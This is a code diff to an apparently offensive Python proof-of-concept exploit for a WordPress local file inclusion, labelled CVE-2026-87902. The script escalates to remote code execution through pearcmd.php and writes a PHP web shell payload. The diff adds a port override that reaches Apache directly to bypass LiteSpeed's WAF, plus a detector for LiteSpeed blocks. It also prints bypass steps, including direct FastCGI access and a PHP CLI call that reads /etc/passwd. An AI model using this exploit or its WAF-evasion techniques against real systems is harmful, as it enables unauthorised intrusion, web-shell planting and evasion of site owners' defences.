@@ -115,6 +115,11 @@ BOT_CHALLENGE_INDICATORS: list[str] = [
     "security check",              # Generic
 ]
 
+LITESPEED_403_INDICATORS: list[str] = [
+    "Proudly powered by LiteSpeed Web Server",
+    "LiteSpeed Technologies",
+]
+
 # Specific PEAR output markers (much tighter than bare "config")
 PEAR_SUCCESS_INDICATORS: list[str] = [
     "Writing PEAR configuration file",
@@ -224,6 +229,7 @@ def request_lfi(
     pagename: str,
     session: requests.Session,
     page_id: Optional[int] = None,
+    port: Optional[int] = None,
 ) -> Optional[requests.Response]:
     """
     Fire the LFI request; return the Response or None on network error.
@@ -235,12 +241,20 @@ def request_lfi(
 
     The pagename value is already double-encoded, so we pass it verbatim via
     a hand-crafted URL to prevent requests from double-encoding it again.
+
+    port, when set, overrides the port in base_url (e.g. 8080 for the Apache
+    backend on cPanel servers that run LiteSpeed in front of Apache).
     """
     try:
+        target = base_url
+        if port is not None:
+            from urllib.parse import urlparse, urlunparse
+            p = urlparse(base_url)
+            target = urlunparse(p._replace(netloc=f"{p.hostname}:{port}"))
         if page_id is not None:
-            raw_url = f"{base_url}/?page_id={page_id}&pagename={pagename}"
+            raw_url = f"{target}/?page_id={page_id}&pagename={pagename}"
         else:
-            raw_url = f"{base_url}/?pagename={pagename}"
+            raw_url = f"{target}/?pagename={pagename}"
         return session.get(raw_url, timeout=15, allow_redirects=True)
     except requests.RequestException as exc:
         print(f"[-] Request failed: {exc}")
@@ -250,6 +264,11 @@ def request_lfi(
 def detect_bot_challenge(body: str) -> bool:
     """Return True when the response is a WAF/bot-challenge page, not WordPress."""
     return any(ind in body for ind in BOT_CHALLENGE_INDICATORS)
+
+
+def detect_litespeed_block(status: int, body: str) -> bool:
+    """Return True when LiteSpeed's WAF returned a 403 for the encoded payload."""
+    return status == 403 and any(ind in body for ind in LITESPEED_403_INDICATORS)
 
 
 def confirm_lfi(body: str) -> bool:
@@ -269,6 +288,7 @@ def attempt_pearcmd_rce(
     session: requests.Session,
     page_id: Optional[int] = None,
     cmd_payload: str = '<?=system($_GET["c"])?>',
+    port: Optional[int] = None,
 ) -> Optional[str]:
     """
     Try each known pearcmd.php path.
@@ -301,15 +321,20 @@ def attempt_pearcmd_rce(
         payload = build_lfi_payload(suffix, depth, pearcmd)
         encoded_write = urllib.parse.quote(write_path, safe="")
         encoded_cmd   = urllib.parse.quote(cmd_payload, safe="")
+        target = base_url
+        if port is not None:
+            from urllib.parse import urlparse, urlunparse
+            p = urlparse(base_url)
+            target = urlunparse(p._replace(netloc=f"{p.hostname}:{port}"))
         if page_id is not None:
             raw_url = (
-                f"{base_url}/?page_id={page_id}"
+                f"{target}/?page_id={page_id}"
                 f"&pagename={payload}"
                 f"&+config-create+{encoded_cmd}&{encoded_write}"
             )
         else:
             raw_url = (
-                f"{base_url}/?pagename={payload}"
+                f"{target}/?pagename={payload}"
                 f"&+config-create+{encoded_cmd}&{encoded_write}"
             )
         try:
@@ -392,6 +417,11 @@ examples:
              "(default: /tmp/cve_2026_87902.php).",
     )
     p.add_argument(
+        "--port", type=int, metavar="N",
+        help="Override the destination TCP port (e.g. 8080 to hit Apache directly "
+             "behind LiteSpeed on cPanel servers, bypassing LiteSpeed's WAF).",
+    )
+    p.add_argument(
         "--cookie", metavar="STR",
         help="Cookie header value to send (e.g. 'imunify_js_cookie=abc; wp_session=xyz'). "
              "Obtain from a real browser that has solved a WAF JS challenge.",
@@ -437,7 +467,7 @@ def main() -> None:
     else:
         print(f"[*] Full request URL : {base_url}/?pagename={payload}")
 
-    resp = request_lfi(base_url, payload, session, page_id=args.page_id)
+    resp = request_lfi(base_url, payload, session, page_id=args.page_id, port=args.port)
     if resp is None:
         sys.exit(1)
 
@@ -448,7 +478,29 @@ def main() -> None:
         print(resp.text[:1000])
         print("───────────────────────────────────────\n")
 
-    if detect_bot_challenge(resp.text):
+    if detect_litespeed_block(resp.status_code, resp.text):
+        print("\n[!]  LiteSpeed WAF blocked the double-encoded payload (403).")
+        print("     LiteSpeed normalises %252F/%252e%252e before PHP sees them.")
+        print("     Bypass options (run from inside the target server):")
+        print()
+        print("     1. Apache backend on port 8080 (cPanel ships both):")
+        print(f"        python3 poc.py {base_url} --page-id {args.page_id or 'N'} -d {args.depth} --port 8080 -v")
+        print()
+        print("     2. Direct FastCGI to lsphp socket (bypasses LiteSpeed entirely):")
+        print("        # find the socket first:")
+        print("        ls /tmp/lshttpd/  # or  ls /run/lshttpd/")
+        print("        cgi-fcgi -bind -connect /tmp/lshttpd/lsphp.sock")
+        print()
+        print("     3. PHP CLI — invoke WordPress directly (no web server at all):")
+        print("        php -r \"")
+        print("          chdir('/path/to/public_html');")
+        print("          define('ABSPATH',getcwd().'/');")
+        print("          \\$_GET['pagename']='templates/../../../etc/passwd';")
+        print("          require('wp-load.php');")
+        print("          echo locate_template('templates/../../../etc/passwd');\"")
+        if not args.rce:
+            return
+    elif detect_bot_challenge(resp.text):
         print("\n[!]  WAF / Bot-challenge detected — not a WordPress response.")
         print("     The WAF (likely Imunify360) is intercepting requests before they")
         print("     reach PHP. Bypass options:")
@@ -485,7 +537,7 @@ def main() -> None:
     print("\n[*] Attempting RCE via pearcmd.php …")
     print(f"[*] Config stub destination : {args.write_path}")
 
-    worked = attempt_pearcmd_rce(base_url, suffix, args.depth, args.write_path, session, page_id=args.page_id)
+    worked = attempt_pearcmd_rce(base_url, suffix, args.depth, args.write_path, session, page_id=args.page_id, port=args.port)
     if worked:
         print(f"\n[+] pearcmd.php triggered via : {worked}")
         print(f"[+] PEAR config stub written  : {args.write_path}")
